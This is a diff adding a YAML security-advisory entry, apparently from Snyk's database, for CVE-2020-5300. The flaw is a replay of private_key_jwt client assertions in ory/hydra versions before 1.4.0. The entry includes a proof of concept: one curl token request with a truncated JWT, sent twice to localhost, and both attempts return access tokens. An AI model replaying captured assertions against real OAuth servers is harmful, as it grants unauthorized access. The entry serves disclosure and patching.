@@ -1,0 +1,49 @@
+---
+- id: snykio:go:github.com/ory/hydra/oauth2:564270
+  title: Replay Attack
+  description: |
+    [github.com/ory/hydra/oauth2][1] is a OAuth2 Server and OpenID
+    Certified™ OpenID Connect Provider written in Go.
+
+    Affected versions of this package are vulnerable to Replay Attack.
+    Replay of `private_key_jwt` JWT tokens are possible when performing
+    client authorization.
+
+    ### PoC   {#poc}
+
+        $ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \
+           --header 'Content-Type: application/x-www-form-urlencoded' \
+           --data-urlencode 'grant_type=client_credentials' \
+           --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \
+           --data-urlencode 'scope=application openid' \
+           --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
+           --data-urlencode 'client_assertion=eyJhb [...] jTw'
+        {"access_token":"zeG0NoqOtlACl8q5J6A-TIsNegQRRUzqLZaYrQtoBZQ.VR6iUcJQYp3u_j7pwvL7YtPqGhtyQe5OhnBE2KCp5pM","expires_in":3599,"scope":"application openid","token_type":"bearer"}⏎            ~$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \
+           --header 'Content-Type: application/x-www-form-urlencoded' \
+           --data-urlencode 'grant_type=client_credentials' \
+           --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \
+           --data-urlencode 'scope=application openid' \
+           --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
+           --data-urlencode 'client_assertion=eyJhb [...] jTw'
+        {"access_token":"wOYtgCLxLXlELORrwZlmeiqqMQ4kRzV-STU2_Sollas.mwlQGCZWXN7G2IoegUe1P0Vw5iGoKrkOzOaplhMSjm4","expires_in":3599,"scope":"application openid","token_type":"bearer"}
+
+
+
+    [1]: https://github.com/ory/hydra
+  affected_package: github.com/ory/hydra/oauth2
+  vulnerable_versions:
+  - "<1.4.0"
+  severity: medium
+  package_manager: go
+  cve:
+  - CVE-2020-5300
+  cwe:
+  - CWE-294
+  disclosed_date: 2020-04-02
+  created_date: 2020-04-02
+  last_modified_date: 2020-04-02
+  credit:
+  - Unknown
+  references:
+  - https://github.com/ory/hydra/commit/700d17d3b7d507de1b1d459a7261d6fb2571ebe3
+  source_url: https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMORYHYDRAOAUTH2-564270
